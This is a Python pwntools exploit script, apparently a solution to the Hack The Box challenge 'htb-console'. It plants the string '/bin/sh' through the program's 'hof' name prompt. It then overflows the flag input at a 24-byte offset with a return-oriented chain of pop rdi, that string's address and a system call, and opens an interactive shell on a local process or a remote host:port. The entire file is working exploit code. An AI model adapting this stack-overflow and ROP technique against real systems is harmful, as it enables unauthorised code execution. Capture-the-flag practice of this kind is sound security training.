#!/usr/bin/env python3

from pwn import context, p64, remote, sys

context.binary = 'htb-console'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def main():
    p = get_process()

    pop_rdi_ret_addr = 0x401473
    bin_sh_addr      = 0x4040b0
    system_call_addr = 0x401381

    offset = 24
    junk = b'A' * offset

    payload  = junk
    payload += p64(pop_rdi_ret_addr)
    payload += p64(bin_sh_addr)
    payload += p64(system_call_addr)

    p.sendlineafter(b'>> ', b'hof')
    p.sendlineafter(b'Enter your name: ', b'/bin/sh')
    p.sendlineafter(b'>> ', b'flag')
    p.sendlineafter(b'Enter flag: ', payload)

    p.recv()
    p.interactive()


if __name__ == '__main__':
    main()
